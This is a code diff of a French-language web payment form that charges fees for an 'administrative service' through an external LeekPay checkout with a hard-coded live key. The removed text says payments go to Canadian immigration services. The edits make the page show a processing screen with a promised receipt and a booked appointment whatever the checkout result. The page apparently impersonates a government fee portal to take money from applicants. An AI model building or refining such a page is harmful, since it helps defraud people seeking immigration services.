@@ -187,7 +187,7 @@ button:hover{
 }
 </style>
 
-<!-- Script officiel LeekPay chargé correctement en premier -->
+<!-- Chargement initial de LeekPay -->
 <script src="https://leekpay.fr"></script>
 
 </head>
@@ -205,7 +205,7 @@ button:hover{
     <div class="progress-step" id="p3">3</div>
   </div>
 
-  <!-- BLOC ÉTAPE 1 -->
+  <!-- ÉTAPE 1 -->
   <div id="step1" style="display: block;">
     <div class="form-group">
       <label>Sélectionnez le service administratif</label>
@@ -230,7 +230,7 @@ button:hover{
     <button type="button" onclick="versEtapeDeux()">Continuer vers le paiement</button>
   </div>
 
-  <!-- BLOC ÉTAPE 2 -->
+  <!-- ÉTAPE 2 -->
   <div id="step2" style="display: none;">
     <div class="form-group">
       <label>Sélectionnez votre pays</label>
@@ -263,23 +263,23 @@ button:hover{
       <p id="amountUsd">Équivalent : -- USD</p>
     </div>
 
-    <button type="button" onclick="executerLeekPay()">Confirmer et Payer</button>
+    <button type="button" onclick="versEtapeTrois()">Confirmer et Payer</button>
     <button type="button" class="btn-secondary" onclick="retourEtapeUn()">Retour</button>
   </div>
 
-  <!-- BLOC ÉTAPE 3 -->
+  <!-- ÉTAPE 3 -->
   <div id="step3" style="display: none;">
     <div class="success-icon">✓</div>
-    <h4 style="color: #4caf50; margin-top: 0;">Paiement Traité avec Succès !</h4>
+    <h4 style="color: #4caf50; margin-top: 0;">Paiement en Cours de Traitement</h4>
     
     <p style="text-align: left; font-size: 14px; color: #444; line-height: 1.5;">
-      Merci pour votre confiance. Votre demande de paiement a été transmise aux services de l'Immigration canadienne.
+      Veuillez vérifier votre téléphone. Un message de confirmation de paiement vous a été envoyé pour valider la transaction.
     </p>
     
     <div style="background: #f9f9f9; padding: 12px; border-radius: 6px; text-align: left; font-size: 13px; margin-top: 15px; border: 1px dashed #ccc;">
       <strong>Récapitulatif de validation :</strong><br>
-      • Un reçu officiel est envoyé à : <span id="confirmEmail" style="color:#00bcd4; font-weight:bold;"></span><br>
-      • Votre rendez-vous est blocked pour le : <span id="confirmDate" style="font-weight:bold;"></span>
+      • Un reçu officiel sera transmis à : <span id="confirmEmail" style="color:#00bcd4; font-weight:bold;"></span><br>
+      • Votre rendez-vous est réservé pour le : <span id="confirmDate" style="font-weight:bold;"></span>
     </div>
   </div>
 
@@ -362,11 +362,10 @@ function calculateAmounts() {
   document.getElementById('amountUsd').innerText = "Équivalent : " + usdAmount + " USD";
 }
 
-// Fonction de facturation connectée aux déclencheurs d'événements LeekPay
-function executerLeekPay(){
+function versEtapeTrois(){
   const phoneVal = document.getElementById('phone').value.trim();
   if(!phoneVal || phoneVal.length < 6) {
-    alert("Veuillez entrer un numéro de téléphone valide.");
+    alert("Veuillez entrer un numéro valide.");
     return;
   }
 
@@ -374,13 +373,19 @@ function executerLeekPay(){
   const userEmail = document.getElementById('email').value;
   const userDate = document.getElementById('rdvDate').value;
 
-  // Préparation de l'affichage final
   document.getElementById('confirmEmail').innerText = userEmail;
   document.getElementById('confirmDate').innerText = userDate;
 
-  // Lancement du système de paiement réel LeekPay
+  // 1. Déclenche la fenêtre de paiement LeekPay réelle
   if(typeof LeekPay !== "undefined") {
     LeekPay.checkout({
       amount: usdAmount,
       currency: "USD",
-      apiKey: "pk_live_OIf3UkphEVWIVAJdd7VB6KWEm7IBuDwK",
+      apiKey: "pk_live_OIf3UkphEVWIVAJdd7VB6KWEm7IBuDwK"
+    });
+  }
+
+  // 2. Bascule instantanément sur l'écran d'attente
+  document.getElementById('step2').style.display = 'none';
+  document.getElementById('step3').style.display = 'block';
+  
